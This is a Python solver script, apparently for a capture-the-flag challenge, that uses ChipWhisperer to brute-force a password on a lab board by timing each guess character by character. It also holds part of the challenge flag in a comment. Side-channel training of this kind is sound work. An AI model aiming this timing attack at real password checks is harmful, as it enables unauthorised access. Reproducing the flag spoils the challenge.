import time
import struct
from string import ascii_lowercase, ascii_uppercase, digits

import chipwhisperer as cw


CHARSET = ascii_lowercase + ascii_uppercase + digits
PASSWORD_LENGTH = 12

scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
scope.default_setup()


def reset_target(): 
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.05)


def verify(password):
    start = time.perf_counter()

    timeout = target.simpleserial_write('b', password)
    if timeout:
        raise RuntimeError("Capture timed out.")

    response = target.simpleserial_read('r', 1)
    end = time.perf_counter()
    timing = end - start
    return struct.unpack("<B", response)[0], timing


def num_q():
    target.simpleserial_write('q', b"0")
    response = target.simpleserial_read('r', 4)
    return struct.unpack("<I", response)[0]


def main():
    reset_target()

    prefix = b"gk2{"
    middle = b""            # The first 6 work on the old chipwhisperer nano.
    # middle = b"7rU3nc"    # The second 6 work on the newer chipwhisperer nano.
    suffix = b"}"

    # Sample timing 
    reference_password = prefix + middle + (PASSWORD_LENGTH - len(middle)) * b"!" + suffix 
    _, timing_sample = verify(reference_password)

    # Find password
    for i in range(PASSWORD_LENGTH//2):
        padding = (PASSWORD_LENGTH - 1 - len(middle)) * b"!"
        for character in CHARSET:
            character = character.encode()
            password = prefix + middle + character + padding + suffix
            response, timing = verify(password)

            print(f'Testing: {password.decode()}, Timing: {timing:.3f}')

            if abs(timing - timing_sample) > 0.002:
                middle += character
                timing_sample = timing
                break

    print(f"\nGot response {response} for password: {password.decode()}")

    response = num_q()
    print(f"Number of queries: {response}")


if __name__ == "__main__":
    main()
